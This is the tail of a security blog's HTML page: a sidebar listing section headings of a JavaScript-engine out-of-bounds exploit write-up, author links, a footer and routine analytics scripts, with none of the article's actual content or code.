    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#The-bug"><span class="nav-number">1.</span> <span class="nav-text">The bug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reproducing-the-bug"><span class="nav-number">2.</span> <span class="nav-text">Reproducing the bug</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Triggering-an-OOB-access"><span class="nav-number">3.</span> <span class="nav-text">Triggering an OOB access</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JavaScript-exploitation-primitives"><span class="nav-number">4.</span> <span class="nav-text">JavaScript exploitation primitives</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Building-the-primitives"><span class="nav-number">5.</span> <span class="nav-text">Building the primitives</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-execution"><span class="nav-number">6.</span> <span class="nav-text">Code execution</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">7.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%91%E8%87%AA"><span class="nav-number">8.</span> <span class="nav-text">译自</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/lucifer11.jpg">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">all things about infosec & ctf</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">131</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">29</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">39</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2017 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">31:01</span>
</div>
  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly9tdXNlLnRoZW1lLW5leHQub3Jn">NexT.Muse</span>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
